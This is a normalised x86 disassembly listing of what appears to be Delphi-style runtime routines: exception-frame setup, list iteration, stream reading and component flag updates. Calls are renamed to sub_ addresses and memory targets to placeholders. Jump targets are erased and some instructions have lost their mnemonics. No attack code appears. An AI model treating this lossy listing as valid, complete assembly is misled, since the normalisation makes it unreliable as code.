call sub_418930
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418930
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418778
sub_41bdf0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418930
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418930
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_4187c4
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418778
sub_41be38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41bfd1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_418cd4
mov edi eax
xor edx edx
push ebp
push sub_41bfb2
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bfb9
mov eax [ rw-data ]
call sub_418d38
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41bf93
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41bf41
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_4188d4
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_418294
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bf48
mov eax [ ebp - 0x8 ]
call sub_4032a8
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_414da4
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41bdb8
pop ecx
mov edx esi
mov eax edi
call sub_4187c4
mov eax ebx
call sub_4032a8
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41bcf0
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41bdf0
pop ecx
inc esi
sub_41bf48
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4188d4
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub_41bfe0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418cd4
mov edi eax
xor eax eax
push ebp
push sub_41c07b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418d38
retn
mov edx ebx
mov eax edi
call sub_4188d4
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_4187c4
mov eax esi
call sub_4032a8
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_408048
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41c08c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418cd4
mov edi eax
xor eax eax
push ebp
push sub_41c103
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418d38
retn
mov edx ebx
mov eax edi
call sub_4188d4
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_4187c4
mov eax esi
call sub_4032a8
sub_41c134
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
call sub_403a74
pop ecx
pop edx
pop ebx
retn
sub_41c178
push ebx
push esi
push edi
call sub_403674
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41bab8
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_41c1b4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41e08c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41e19c
call sub_41c128
sub_41c1d8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_408048
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_404038
sub_41c20c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_408048
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e08c
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c2cd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41c650
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41c650
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c2d4
mov eax [ ebp - 0x8 ]
call sub_4032a8
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41e19c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41c128
sub_41c2fc
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41c31c
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_4042d4
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_40352c
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41c128
sub_41c384
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_418cd4
mov esi eax
xor edx edx
push ebp
push sub_41c3f4
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c3fb
mov eax [ rw-data ]
call sub_418d38
retn
mov edx ebx
mov eax esi
call sub_4188d4
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_4032a8
mov edx ebx
mov eax esi
call sub_4187c4
sub_41c400
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c50f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c516
lea eax [ ebp - 0x8 ]
call sub_404038
retn
xor edx edx
push ebp
push sub_41c4f2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c544
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41bc14
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4188d4
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_4040d0
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41bcf0
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4188d4
call sub_41c384
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4188d4
mov edx eax
mov eax [ rw-data ]
call sub_418c4c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_418a20
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41c520
push ebx
mov ebx eax
mov eax ebx
call sub_41c614
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41b018
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41c544
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_4032a8
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4188d4
call sub_4032a8
inc edi
dec esi
jne r-xdata
sub_41c580
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4031f0
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_417d60
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_403234
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_417dd8
mov edi eax
mov edx [ esp + 0x4 ]
call sub_417cd8
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_40320c
test al al
jne r-xdata
sub_41c650
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41c69c
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41c69c
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
sub_41c6ec
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c737
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41deec
mov eax [ ebp - 0x4 ]
call sub_4042f8
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c73e
lea eax [ ebp - 0x4 ]
call sub_404038
retn
call sub_41c128
sub_41c744
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41c7e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c2e8
test al al
jne r-xdata
mov eax ebx
call sub_41c2e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419674
jmp r-xdata
mov eax ebx
call sub_41c62c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41d254
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c7eb
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_4195a8
mov esi eax
mov eax ebx
call sub_41d24c
jmp r-xdata
mov eax ebx
call sub_41d19c
mov eax ebx
call sub_41c2e8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41d3b8
mov eax ebx
call sub_41d254
sub_41c814
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40508c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_418778
inc esi
dec ebx
jne r-xdata
sub_41c850
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_42156c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40508c
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405248
add esp 0x4
mov edx ebx
mov eax edi
call sub_421540
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40508c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_421540
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41c8c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40508c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41c930
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41c950
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40275c
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41c930
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41e380
call sub_40275c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_4032a8
sub_41c9b0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41ca96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41e520
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41ca6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41ca9b
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c950
pop ecx
test al al
jne r-xdata
call sub_403af0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a9c
sub_41cac0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41cb38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_4034a4
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_418294
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41cb60
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41cbdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41e520
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_4034a4
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41cbe0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c950
pop ecx
test al al
jne r-xdata
call sub_403af0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a9c
sub_41cc04
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ce25
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41deb0
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41deb0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41cdf5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41cdb3
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c850
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c8c8
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41c9b0
pop ecx
push ebp
call sub_41cb60
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41cac0
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403b20
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c8c8
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41c8c8
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ce2c
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405254
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_4034a4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418930
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c814
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418778
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c814
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418778
sub_41cdb8
push ebp
call sub_41c930
pop ecx
test al al
je r-xdata
call sub_403a9c
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_4032a8
sub_41ce40
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ceb0
pop ebx
pop ecx
pop ebp
